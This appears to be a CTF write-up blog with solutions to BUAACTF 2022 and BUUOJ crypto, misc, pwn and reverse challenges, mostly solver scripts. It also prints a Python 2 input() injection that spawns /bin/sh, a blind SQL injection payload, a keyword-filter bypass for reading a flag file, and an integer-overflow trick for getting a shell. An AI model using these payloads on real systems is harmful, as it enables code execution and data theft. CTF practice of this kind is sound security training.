^ leftrow(x1, 8)) &amp; 0xffffffffffffffff x1 = (x1 ^ leftrow(x0, 20)) &amp; 0xffffffffffffffff x0 = (x0 ^ x1) &amp; 0xffffffffffffffff x0 = PL(x0) x1 = PR(x1) Y = (x0 &lt;&lt; 64) ^ x1 return Yif __name__ == '__main__': x = 0x0123456789abcdeffedcba9876543210 key1, key2 = s2n(flag[:len(flag) // 2]), s2n(flag[len(flag) // 2:]) cipher1 = encrypt(x, key1) cipher2 = encrypt(x, key2) print('plaintext =' + hex(x)) print('ciphertext1 =' + hex(cipher1)) print('ciphertext2 =' + hex(cipher2))# plaintext = 0x0123456789abcdeffedcba9876543210# ciphertext1 = 0x16c95bd05e564b89e980dbf517d0f7c4# ciphertext2 = 0xe4d1e2ccf953490de0e894b47efead9c 简单的块分组密码，加密思路也跟DES分组密码差不多，通过一些置换、移位操作来达到扩散效果，而这部分是可逆的，唯一的非线性部分是s和的替代，这部分可以通过爆破s盒来反解出密钥，单轮也只需要进行16*16次计算即可爆破成功。 解体脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from libnum import n2ss = [0x7, 0x4, 0x9, 0xc, 0xb, 0xa, 0xd, 0x8, 0xf, 0xe, 0x1, 0x6, 0x0, 0x3, 0x2, 0x5]PL1 = [1, 3, 4, 6, 0, 2, 7, 5]invertPL1=[4,0,5,1,2,7,3,6]PR1 = [2, 7, 5, 0, 1, 6, 4, 3]invertPR1=[3,4,0,7,6,2,5,1]# def S(x, bit):# after_sbox = 0# for i in range(bit):# after_sbox ^= (s[(x &gt;&gt; i * 4) &amp; 0xf] &lt;&lt; i * 4)# return after_sboxdef leftrow(x, num): left = x &gt;&gt; 32 right = x &amp; 0xffffffff l = ((left &lt;&lt; num) ^ (left &gt;&gt; 32 - num)) &amp; 0xffffffff r = ((right &lt;&lt; num) ^ (right &gt;&gt; 32 - num)) &amp; 0xffffffff return (l &lt;&lt; 32) ^ rdef invert_PL(x): z = [] for i in range(8): z.append((x &gt;&gt; (7 - i) * 8) &amp; 0xff) res = 0 for i in range(8): res ^= (z[invertPL1[i]] &lt;&lt; (7 - i) * 8) return resdef invert_PR(x): z = [] for i in range(8): z.append((x &gt;&gt; (7 - i) * 8) &amp; 0xff) res = 0 for i in range(8): res ^= (z[invertPR1[i]] &lt;&lt; (7 - i) * 8) return resdef rightrow(x, num): left = x &gt;&gt; 32 right = x &amp; 0xffffffff l = ((left &gt;&gt; num) ^ (left &lt;&lt; 32 - num)) &amp; 0xffffffff r = ((right &gt;&gt; num) ^ (right &lt;&lt; 32 - num)) &amp; 0xffffffff return (l &lt;&lt; 32) ^ rdef decrypt(plaintext,cipher): key=0 x0, x1 = cipher &gt;&gt; 64, cipher &amp; 0xffffffffffffffff x1=invert_PR(x1) x0=invert_PL(x0) x0 = (x0 ^ x1) &amp; 0xffffffffffffffff x1 = (x1 ^ leftrow(x0, 20)) &amp; 0xffffffffffffffff x0 = (x0 ^ leftrow(x1, 8)) &amp; 0xffffffffffffffff x1 = (x1 ^ leftrow(x0, 8)) &amp; 0xffffffffffffffff x0 = (x0 ^ leftrow(x1, 4)) &amp; 0xffffffffffffffff x1 = (x1 ^ x0) &amp; 0xffffffffffffffff x0_, x1_ = plaintext &gt;&gt; 64, plaintext &amp; 0xffffffffffffffff # print(x0_,x0) rk0=Boom(x0_,x0) rk1=Boom(x1_,x1) key=(rk0&lt;&lt;64)|rk1 # print(len(n2s(key))) return keydef Boom(pla,cip): tmp=0 #0~0xff key=0 for i in range(16): for tmp in range(16): if s[((pla &gt;&gt; i * 4) &amp; 0xf)^tmp]== (cip &gt;&gt; i * 4)&amp;0xf: key&lt;&lt;=4 key|=tmp break return int((hex(key)[2:])[::-1],16)key1=decrypt(0x0123456789abcdeffedcba9876543210,0x16c95bd05e564b89e980dbf517d0f7c4)key2=decrypt(0x0123456789abcdeffedcba9876543210,0xe4d1e2ccf953490de0e894b47efead9c)print(n2s(key1),n2s(key2))print(key1,key2)# print(hex(encrypt(0x0123456789abcdeffedcba9876543210,key1))) ez_des题目就不放了，（出题人的DES确实写的丑陋） 思想是单轮DES的破解，其实大致思路与上体Block相似，也是通过逆向操作和爆破S盒来还原密钥。不太相同的是因为采用了Feistel结构，大部分函数直接用就行，也不需要编写反函数，然后S盒的结构不太一样，导致需要对多组明密文对进行分析才能还原出密钥。 附上自己写的脚本：(早知网上有脚本就开抄了，耗了好多时间写这玩意) 还原密钥： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131from libnum import n2sdef IP(data):#初始置换 L0=0 R0=0 for i in range(4): for j in range(58+2*i,1+2*i,-8): L0&lt;&lt;=1 L0|=((data&gt;&gt;(64-j))&amp;0x1) for i in range(4): for j in range(57+2*i,0+2*i,-8): R0&lt;&lt;=1 R0|=((data&gt;&gt;(64-j))&amp;0x1) return L0,R0def expandReplacement(data):#拓展置换E result=0 for i in range(8): result&lt;&lt;=1 if i==0: result|=data&amp;0x1 else: result+=(data&gt;&gt;(32-4*i))&amp;0x1 for j in range(4): result&lt;&lt;=1 result|=(data&gt;&gt;(32-(j+4*i+1)))&amp;0x1 result&lt;&lt;=1 if i==7: result|=(data&gt;&gt;31)&amp;0x1 else: result|=(data&gt;&gt;(32-(5+4*i)))&amp;0x1 #print(bin(result)) return resultdef sbox(data,i): result=0 sbox=[ [[14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7], [0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8], [4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0], [15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13]], [[15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10], [3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5], [0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15], [13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9]], [[10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8], [13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1], [13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7], [1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12]], [[7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15], [13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9], [10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4], [3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14]], [[2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9], [14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6], [4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14], [11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3]], [[12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11], [10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8], [9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6], [4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13,]], [[4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1], [13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6], [1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2], [6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12]], [[13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7], [1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2], [7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8], [2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11]]] for _ in range(1):#row为行，column为列 row=(((data&gt;&gt;4)&amp;0b10))|(data&amp;1) column=((data&gt;&gt;1)&amp;0b1111) tmp=sbox[i][row][column] for j in range(4): result&lt;&lt;=1 result|=(tmp&gt;&gt;(4-(j+1)))&amp;0x1 return resultdef pbox(data,si): loc=[] table=[16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25] for i in range(si*4,4+si*4): loc.append(table.index(i+1)) return loc def invertPbox(data): invertTable=[9, 17, 23, 31, 13, 28, 2, 18, 24, 16, 30, 6, 26, 20, 10, 1, 8, 14, 25, 3, 4, 29, 11, 19, 32, 12, 22, 7, 5, 27, 15, 21] result=0 for i in range(32): result&lt;&lt;=1 result|=(data&gt;&gt;(32-invertTable[i]))&amp;0x1 return resultdef int2list(v):#转化为长度为8，每个数字大小为4位的数组 li=[] for i in range(8): li.append(v&amp;0xf) v&gt;&gt;=4 return li[::-1]def int2list2(v):#转化为长度为32的二进制数组 li=[] for i in range(32): li.append(v&amp;0b1) v&gt;&gt;=1 return li[::-1]def Boom(plaintext,ciphertext):#解密函数 L0_,R0_=IP(ciphertext) R0_=int2list2(R0_) L0_=int2list2(L0_) L0,R0=IP(plaintext) tmp=int2list2(L0) L0=R0 R0=expandReplacement(R0) roundKey1=[] for i in range(8): site=[] for key in range(64): tmpR0=((R0&gt;&gt;(42-6*i))^key)&amp;0b111111 #tmpR0 6位 key 6位 tmpR0=sbox(tmpR0,i) loc=pbox(tmpR0,i) tmpR0=((tmp[loc[0]]&lt;&lt;3)|(tmp[loc[1]]&lt;&lt;2)|(tmp[loc[2]]&lt;&lt;1)|(tmp[loc[3]]))^tmpR0 # print(tmpR0) if (tmpR0&gt;&gt;3)&amp;1==R0_[loc[0]] and (tmpR0&gt;&gt;2)&amp;1==R0_[loc[1]] and (tmpR0&gt;&gt;1)&amp;1==R0_[loc[2]] and (tmpR0&gt;&gt;0)&amp;1==R0_[loc[3]]: site.append(key) # print(loc) roundKey1.append(site) return roundKey1print((Boom(0x0123456789abcdef,0x2a138211ec75e47d)))print((Boom(0xfedcba9876543210,0xf74ed54cb9001180)))print((Boom(0xabcdef0123456789,0xdd465f0a99001bc4)))print((Boom(0x9876543210fedcba,0xee310a9baa7f46f5)))print((Boom(0xabcdefabcdefabcd,0xd5ec5f7f4c5f7d64))) 对爆破出来的可能密钥进行一个求交集的操作，最后一位补0/1，就得到了真正的密钥： 123456789101112131415from libnum import n2sa=[59,61,12,30,51,3,33,16]flag=''for i in a: flag+=bin(i)[2:].zfill(6)newflag=''j=0for i in range(55): if i%8==0: newflag+='0' else: newflag+=flag[j] j+=1newflag+='1'print(n2s(int(newflag,2))) fyh’s gift题目描述： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import hashlibfrom Crypto.Cipher import AESfrom secret import flagp = 1227746669897024584176049601139983199725970765368150228682221 a = 2b = 3E = EllipticCurve(GF(p), [a,b])G = E.gens()[0]def gen_key(): sk = randint(1, 2 ** 62) pk = G * sk return sk, pkdef gen_shared_secret(Q, n): return (Q * n)[0]def encrypt_flag(shared_secret): sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode('ascii')) key = sha1.digest()[:16] iv = b'\\x00' * 16 cipher = AES.new(key, AES.MODE_CBC, iv) return cipher.encrypt(flag).hex()def decrypt_flag(secret_key, ciphertext): sha1 = hashlib.sha1() sha1.update(str(secret_key).encode('ascii')) key = sha1.digest()[:16] iv = b'\\x00' * 16 enc = bytes.fromhex(ciphertext) cipher = AES.new(key, AES.MODE_CBC, iv) flag = cipher.decrypt(enc).decode() return flagalice_key = gen_key()bob_key = gen_key()print('Alice Public Key:', alice_key[1])# Alice Public Key: (302815835537564389018621724598932443372058309945965909258476 : 101620440267876945129965564956309591452288432027338930366277 : 1)print('Bob Public Key:', bob_key[1])# Bob Public Key: (65110746247642118366859050011022338368545596077949479875681 : 1017598375305367769482826313607595483103330800029116590734900 : 1)shared_secret = gen_shared_secret(alice_key[1], bob_key[0])ciphertext = encrypt_flag(shared_secret)print(ciphertext)# da4ba62b1dbcdf0d8b3df8b4e253d7ef328c6a37a7d6569e9c2c577d683e1ba12d83828fdf2b2b390da5d05558f8dbcb0796ef874000f87486d679aa0c954a75 第一次做ECC的题目…也第一次用sage，连函数都调不明白（菜） 看附件的话是ECDH密钥交换算法，密钥有62位大小。 看的时候想到暗泉杯有一题也是DH密钥交换，密钥42位，用大步小步法就可以解决掉。开始时想试试用这个能不能跑出来，结果跑一晚上显示内存不够跑不出来（/(ㄒoㄒ)/~~） 后来查资料，找到了这个简析ECC攻击方法之Pohlig-Hellman - 安全客，安全资讯平台 (anquanke.com)，这个算法能把复杂度降到O(p1^(1/2))，其中p1是阶数n的最大素因子。看一看阶数n的分解： 还可以，尝试一下就解出来了。注意需要去掉第一个因子和最后一个因子，否则跑出出来。 123456789101112131415161718192021222324print('start')M = 1227746669897024584176049601139983199725970765368150228682221 A = 2B = 3F = FiniteField(M)E = EllipticCurve(F,[A,B])G = E.gens()[0]Pub=E([302815835537564389018621724598932443372058309945965909258476 , 101620440267876945129965564956309591452288432027338930366277 ])Pub2=E([65110746247642118366859050011022338368545596077949479875681 , 1017598375305367769482826313607595483103330800029116590734900 ])factors, exponents = zip(*factor(E.order()))primes = [factors[i] ^ exponents[i] for i in range(len(factors))][1:-1]print(primes)dlogs = []print(G.order())for fac in primes: t = int(G.order()) // int(fac) dlog = discrete_log(t*Pub,t*G,operation=&quot;+&quot;) dlogs += [dlog] print(&quot;factor: &quot;+str(fac)+&quot;, Discrete Log: &quot;+str(dlog)) #calculates discrete logarithm for each prime orderl = crt(dlogs,primes)print(l)print(l*G==Pub) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import hashlibfrom Crypto.Cipher import AESp = 1227746669897024584176049601139983199725970765368150228682221 a = 2b = 3E = EllipticCurve(GF(p), [a,b])G = E.gens()[0]def gen_key(): sk = randint(1, 2 ** 62) pk = G * sk return sk, pkdef gen_shared_secret(Q, n): return (Q * n)[0]def encrypt_flag(shared_secret): sha1 = hashlib.sha1() sha1.update(str(shared_secret).encode('ascii')) key = sha1.digest()[:16] iv = b'\\x00' * 16 cipher = AES.new(key, AES.MODE_CBC, iv) return cipher.encrypt(flag).hex()def decrypt_flag(secret_key, ciphertext): sha1 = hashlib.sha1() sha1.update(str(secret_key).encode('ascii')) key = sha1.digest()[:16] iv = b'\\x00' * 16 enc = bytes.fromhex(ciphertext) cipher = AES.new(key, AES.MODE_CBC, iv) flag = cipher.decrypt(enc) return flagdef gen_shared_secret(Q, n): return (Q * n)[0]Pub1=E([302815835537564389018621724598932443372058309945965909258476 , 101620440267876945129965564956309591452288432027338930366277 ])Pub2=E([65110746247642118366859050011022338368545596077949479875681 , 1017598375305367769482826313607595483103330800029116590734900 ])cip='da4ba62b1dbcdf0d8b3df8b4e253d7ef328c6a37a7d6569e9c2c577d683e1ba12d83828fdf2b2b390da5d05558f8dbcb0796ef874000f87486d679aa0c954a75'sec=1727995788222408513Skey=gen_shared_secret(Pub2,sec)print(decrypt_flag(Skey,cip)) Misc太久不写Misc，已经没啥思路了 welcome easy_game一开始以为和Crypto的ez_game一样，准备套个脚本就上去搞，直到我整出了这个flag：flag{**} (lll￢ω￢) 再仔细看了一下题目和hint，发现题目使用python2写的，涉及到了input函数的漏洞：(29条消息) Python2中input()函数漏洞_SkYe231_的博客-CSDN博客_python2的input函数 python2中的input函数会将stdin输入的内容当作是代码去执行，例如输入1+2，input的返回值就是3，而不是“1+2”。这导致了我们可以向服务器输入恶意代码，做到任意代码执行，例如输入： 1__import__('os').system('/bin/sh') 就可以获得主机权限了。而在这题中，利用该漏洞找到flag位置即可cat flag了。 sqlmisc2sql盲注类型 开始搜索字符串’flag’，定位关键字段。发现是将数据库中的flag转为十六进制再转二进制后翻转一下，检测每一位是否为1，若该为等于1，则sleep(2)。 110.0.1.1 - - [01/Mar/2015:13:15:05 -0500] &quot;GET /alg.php?user=admin' AND IF(/*UrNa*/SUBSTRING(REVERSE(/*TG1CJuN*/CONV(HEX(SUBSTRING(/*AcRaD*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*DS1FxfPA*/),1,1)),16,2))/*HqiOs*/,1,1)=1,SLEEP(2),14209) AND '59548 HTTP/1.1&quot; 200 431 &quot;-&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0&quot; 由此可以根据时间间隔去判断flag的每一位，拼接起来得到flag。 但不知道为啥，最终拼起来得到的flag不对-.-！ 问了一下出题人，才发现也可以根据包判断，即sleep(2)的时候程序会随便发一个包，可以根据那个来判断flag的位 脚本如下： 123456789101112131415161718192021222324import base64tmp=open('111.txt','r').read().split('\\n')flag=''i=0while(i&lt;len(tmp)-1): if len(tmp[i+1])-len(tmp[i])&gt;100: flag+='1' i+=2 else: flag+='0' i+=1reflag=''t=''print(len(flag))flag=flag[1:]for i in range(len(flag)): t+=flag[i] # print(t) if (i+1)%7==0: # print(t) reflag+=chr(int(t[::-1],2)) t='' print(reflag) PwnOr4ngeOj真·签到题 直接读取文件，在输出到屏幕上即可 1234567891011#include &lt;stdio.h&gt; int main(){printf(&quot;test&quot;);FILE *fp;fp=fopen(&quot;flag&quot;,&quot;r&quot;);char a[200];fscanf(fp,&quot;%s&quot;,a);printf(&quot;%s&quot;,a);} math_genius_revengeint类型的溢出，利用Min(int)/-1的异常 在最后一轮除法操作的时候，输入 -2147483648 -1即可getshell Or4ngeOJ-revengeOJ屏蔽了一些关键词：flag、open 利用宏定义和换行或字符数组可以绕过该检测 12345678910111213#include &lt;stdio.h&gt;#define test fo\\penint main(){char s[]={102,108,97,103,0};printf(&quot;test&quot;);FILE *fp;fp=test(s,&quot;r&quot;);char a[200];fscanf(fp,&quot;%s&quot;,a);printf(&quot;%s&quot;,a);} Reversecheckin简单的加密算法，注意一下输入格式即可逆出flag 1234567891011121314151617181920212223a=[0xB ,0x94, 0xBA, 0x4B, 0xAA, 0xA6, 0x65, 0x8C, 0x30, 0x93,0xE0, 0xA2, 0xCB, 0x50, 0xEB, 0xD2]trans=[0xE, 0x4, 0xD, 0x1, 0x2, 0xF, 0xB, 0x8, 0x3, 0xA, 0x6, 0xC, 0x5, 0x9,0x0, 0x7]mid=[0]*16for i in range(16): mid[trans[i]]=a[i]for i in range(16): mid[i]^=0x87flag=''for i in range(3,-1,-1): flag+=hex(mid[i])[2:]flag+='-'flag+=hex(mid[5])[2:]flag+=hex(mid[4])[2:]flag+='-'flag+=hex(mid[7])[2:]flag+=hex(mid[6])[2:]flag+='-'flag+=hex(mid[9])[2:].zfill(2)flag+=hex(mid[8])[2:].zfill(2)flag+='-'for i in range(10,16): flag+=hex(mid[i])[2:]print(flag) flowernc地址后得到的是一串base64字符串，解码后是一个elf可执行文件 看题目还以为考的是花指令…傻傻地分析了好久发现解出的flag不对，才发现每次nc给的程序的flag都不一样，并且只有30s的分析时间，否则就会关闭连接。 想起来之前用的符号执行的脚本，利用angr可以自动化分析并执行程序，写了个脚本就过了 123456789101112131415161718192021222324252627282930import angrimport claripyimport base64from pwn import *pr=remote(&quot;101.43.185.64&quot;,&quot;12345&quot;)flow=pr.recvuntil(b&quot;[+]&quot;)fp=open('./elf','wb')fp.write(base64.b64decode(flow))fp.close()p=angr.Project('./elf',load_options={&quot;auto_load_libs&quot;: False})f=p.factorystate = f.entry_state(addr=0x401156)#设置state开始运行时的地址flag = claripy.BVS('flag',8*32)#要求的内容有32个，用BVS转成二进制给flag变量sm = p.factory.simulation_manager(state)#准备从state开始遍历路径print(&quot;开始执行&quot;)sm.explore(find=0x401182)#遍历到成功的地址if sm.found: print(&quot;执行成功&quot;) x=sm.found[0].posix.dumps(0) [:32] print(x)else: print('错误')pr.sendafter(b&quot;key:&quot;,x)pr.interactive() flag{Thi5_m@Y_H3lp_y0u_Get_s7arted_1n_auto_REV} HiJackSMC加进程调用，拖进IDA，先分析Hi.exe 开始就发现程序对某个地方做了异或的处理 然后进入一个函数，其中创建了一个进程并调用了Jack.exe，并把之前作异或的那个地方写进了进程的内存。 对程序进行动调，看一下qword_140001000是干什么的，调整了一下，得到了关键部分的代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152strcpy(v18, &quot;Congra&quot;); v10 = 0i64; v11 = 0; strcpy(v16, &quot;tulat&quot;); strcpy(v17, &quot;ions!&quot;); strcpy(v15, &quot;%s&quot;); strcpy(v6, &quot;Wrong!&quot;); v7[0] = 842283315; v7[1] = 825890350; v7[2] = 1060838448; v7[3] = 1008809520; v7[4] = 639384378; v7[5] = 976885268; v7[6] = 741605945; v7[7] = 1008548353; v7[8] = 1043739711; v7[9] = 808532502; v8 = 40; v9[0] = 0i64; v9[1] = 0i64; MEMORY[0x140001060](v15, v9); v1 = 0x140001000i64; v2 = 0x140001BF8i64; if ( (LOBYTE(v9[0]) ^ 0x33) != 85 ) goto LABEL_8; v12 = v0; v0 = 0i64;LABEL_3: if ( v0 == 40 ) { ((void (__fastcall *)(char *))v1)(v18); ((void (__fastcall *)(char *))v1)(v16); ((void (__fastcall *)(char *))v1)(v17); v3 = 0i64; goto LABEL_5; } while ( 1 ) { v4 = *((char *)v9 + ++v0); if ( (*((unsigned __int8 *)v7 + v0) ^ v4) == 85 ) goto LABEL_3; v0 = v12;LABEL_8: ((void (__fastcall *)(char *))v1)(v6); ((void (__fastcall *)(_QWORD))v2)(0i64); v1 = v13; v2 = v14; if ( v3 ) break;LABEL_5: ((void (__fastcall *)(CONTEXT *))v2)(v3); } 其中0x14000….这串地址可以发现是jack.exe中的地址，也就是说这部分处理的是调用Jack.exe中的函数 123MEMORY[0x140001060](v15, v9); v1 = 0x140001000i64;v2 = 0x140001BF8i64; 进到相关地址中，发现第一句实际上是scanf(“%s”,v9)，第二局实际上是printf函数,第三句实际上是，第三句实际上是exit()函数 那么代码逻辑很明显了，就是将 输入进行了一个异或处理，然后将其与v7中的数值进行比较，判断是否正确 做一个反向处理，注意一下大小端，即可获得flag 1234567891011v4=[0]*10v4 = [0x32,0x34,0x39,0x33,0x31,0x3A,0x16,0x2E,0x3F,0x3B,0x1C,0x30,0x3C,0x21,0x36,0x30,0x26,0x1C,0x3B,0x3A,0x3A,0x3A,0x16,0x14,0x2C,0x34,0x02,0x39,0x3C,0x1D,0x3A,0x01,0x3E,0x36,0x34,0x3F,0x30,0x31,0x3A,0x16]flag=''tmp=''for i in range(len(v4)): tmp+=chr(v4[i]^85) if (i+1)%4==0: flag+=tmp[::-1] tmp=''print(flag) dis_mepython逆向，先用pyinstxtractor整出pyc文件 在线反编译pyc文件，得到python源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370#!/usr/bin/env python# visit https://tool.lu/pyc/ for more informationfrom libnum import s2nsbox = [ [ 214, 144, 233, 254, 204, 225, 61, 183, 22, 182, 20, 194, 40, 251, 44, 5], [ 43, 103, 154, 118, 42, 190, 4, 195, 170, 68, 19, 38, 73, 134, 6, 153], [ 156, 66, 80, 244, 145, 239, 152, 122, 51, 84, 11, 67, 237, 207, 172, 98], [ 228, 179, 28, 169, 201, 8, 232, 149, 128, 223, 148, 250, 117, 143, 63, 166], [ 71, 7, 167, 252, 243, 115, 23, 186, 131, 89, 60, 25, 230, 133, 79, 168], [ 104, 107, 129, 178, 113, 100, 218, 139, 248, 235, 15, 75, 112, 86, 157, 53], [ 30, 36, 14, 94, 99, 88, 209, 162, 37, 34, 124, 59, 1, 33, 120, 135], [ 212, 0, 70, 87, 159, 211, 39, 82, 76, 54, 2, 231, 160, 196, 200, 158], [ 234, 191, 138, 210, 64, 199, 56, 181, 163, 247, 242, 206, 249, 97, 21, 161], [ 224, 174, 93, 164, 155, 52, 26, 85, 173, 147, 50, 48, 245, 140, 177, 227], [ 29, 246, 226, 46, 130, 102, 202, 96, 192, 41, 35, 171, 13, 83, 78, 111], [ 213, 219, 55, 69, 222, 253, 142, 47, 3, 255, 106, 114, 109, 108, 91, 81], [ 141, 27, 175, 146, 187, 221, 188, 127, 17, 217, 92, 65, 31, 16, 90, 216], [ 10, 193, 49, 136, 165, 205, 123, 189, 45, 116, 208, 18, 184, 229, 180, 176], [ 137, 105, 151, 74, 12, 150, 119, 126, 101, 185, 241, 9, 197, 110, 198, 132], [ 24, 240, 125, 236, 58, 220, 77, 32, 121, 238, 95, 62, 215, 203, 57, 72]]CK = [ 462357, 472066609, 943670861, 1415275113, 1886879365, 0x8C939AA1L, 0xA8AFB6BDL, 0xC4CBD2D9L, 0xE0E7EEF5L, 0xFC030A11L, 404694573, 876298825, 1347903077, 1819507329, 0x888F969DL, 0xA4ABB2B9L, 0xC0C7CED5L, 0xDCE3EAF1L, 0xF8FF060DL, 337322537, 808926789, 1280531041, 1752135293, 0x848B9299L, 0xA0A7AEB5L, 0xBCC3CAD1L, 0xD8DFE6EDL, 0xF4FB0209L, 269950501, 741554753, 1213159005, 1684763257]def encrypt(data, key): x = [ 0] * 36 (x[0], x[1], x[2], x[3]) = (data &gt;&gt; 96, data &gt;&gt; 64 &amp; 0xFFFFFFFFL, data &gt;&gt; 32 &amp; 0xFFFFFFFFL, data &amp; 0xFFFFFFFFL) key = keyGenerator(key) cipher = x[35] &lt;&lt; 96 | x[34] &lt;&lt; 64 | x[33] &lt;&lt; 32 | x[32] return cipherdef decrypt(data, key): x = [ 0] * 36 (x[0], x[1], x[2], x[3]) = (data &gt;&gt; 96, data &gt;&gt; 64 &amp; 0xFFFFFFFFL, data &gt;&gt; 32 &amp; 0xFFFFFFFFL, data &amp; 0xFFFFFFFFL) key = keyGenerator(key) cipher = x[35] &lt;&lt; 96 | x[34] &lt;&lt; 64 | x[33] &lt;&lt; 32 | x[32] return cipherdef keyGenerator(key): k = [ 0] * 36 (k[0], k[1], k[2], k[3]) = (key &gt;&gt; 96, key &gt;&gt; 64 &amp; 0xFFFFFFFFL, key &gt;&gt; 32 &amp; 0xFFFFFFFFL, key &amp; 0xFFFFFFFFL) (k[0], k[1], k[2], k[3]) = (k[0] ^ 0xA3B1BAC6L, k[1] ^ 1453994832, k[2] ^ 1736282519, k[3] ^ 0xB27022DCL) return kdef T(data): (a0, a1, a2, a3) = (data &gt;&gt; 24, data &gt;&gt; 16 &amp; 255, data &gt;&gt; 8 &amp; 255, data &amp; 255) (b0, b1, b2, b3) = (sbox_subtitute(a0), sbox_subtitute(a1), sbox_subtitute(a2), sbox_subtitute(a3)) data = b0 &lt;&lt; 24 | b1 &lt;&lt; 16 | b2 &lt;&lt; 8 | b3 data = move_left(data, 2) ^ move_left(data, 10) ^ move_left(data, 18) ^ move_left(data, 24) ^ data return datadef sbox_subtitute(data): return sbox[data &gt;&gt; 4][data &amp; 15]def move_left(data, bit): data = data &lt;&lt; bit &amp; 0xFFFFFFFFL | data &gt;&gt; 32 - bit return datadef T_key(key): (a0, a1, a2, a3) = (key &gt;&gt; 24, key &gt;&gt; 16 &amp; 255, key &gt;&gt; 8 &amp; 255, key &amp; 255) (b0, b1, b2, b3) = (sbox_subtitute(a0), sbox_subtitute(a1), sbox_subtitute(a2), sbox_subtitute(a3)) key = b0 &lt;&lt; 24 | b1 &lt;&lt; 16 | b2 &lt;&lt; 8 | b3 key = move_left(key, 13) ^ move_left(key, 23) ^ key return keydef main(): flag = input('input your flag:') if len(flag) &lt; 22 or len(flag) &gt; 38: print('wrong length!') return None# WARNING: Decompyle incompletemain() 熟悉的话其实可以看出是SM4的加密算法，但由于反编译不完整，有部分代码没有反编译出来，还需要通过字节码分析 由于已经反编译出一部分代码，字节码部分选择关键部分看即可 oneQuiz拖进jadx，定位到MainActivity，发现加密函数，找到密钥和密文，扔到AES解密网站上一解就得到了flag","link":"/2022/04/01/BUAACTF-2022-WP/"},{"title":"BUUOJ Reverse(1)","text":"[CFI-CTF 2018]IntroToPE直接扔IDA，发现无法F5，转而查看汇编代码 在此处发现奇怪的Base64字符串，解码后得到flag:CFI{.NetC#_1s_@w3s0m3} [WUSTCTF2020]funnyre拖进ida分析 点进main函数，发现无法反编译为c代码，继续看汇编指令 发现有奇怪的指令，有几条jz、jnz和call指令都指向了不存在的地址，导致了F5的失败 将它们还有下面的几处都nop掉，再p一下得到了能看的c代码 一千多行，不是人能做的，寄！ 上网进行一个大佬的题解代码的抄，顺便了解了一下啥是符号执行（虽然还是不太懂 12345678910111213141516171819202122232425import angrimport claripyp=angr.Project('C:\\\\Users\\\\80424\\\\Downloads\\\\attachment',load_options={&quot;auto_load_libs&quot;: False})f=p.factorystate = f.entry_state(addr=0x400605)#设置state开始运行时的地址flag = claripy.BVS('flag',8*32)#要求的内容有32个，用BVS转成二进制给flag变量state.memory.store(0x603055+0x300+5,flag)#因为程序没有输入，所以直接把字符串设置到内存state.regs.rdx=0x603055+0x300state.regs.rdi=0x603055+0x300+5#然后设置两个寄存器sm = p.factory.simulation_manager(state)#准备从state开始遍历路径print(&quot;开始执行&quot;)sm.explore(find=0x401DAE)#遍历到成功的地址if sm.found: print(&quot;执行成功&quot;) x=sm.found[0].solver.eval(flag,cast_to=bytes) print(x)else: print('错误') 得到flag:flag{1dc20f6e3d497d15cef47d9a66d6f1af} 最后附上符号执行的相关资料： 5.3 符号执行 · CTF All In One (gitbooks.io) [羊城杯 2020]login下载附件，可以发现是python逆向题 使用pyinstxtractor整出.pyc文件 在解压出来的文件中发现login.pyc文件，使用010editor打开 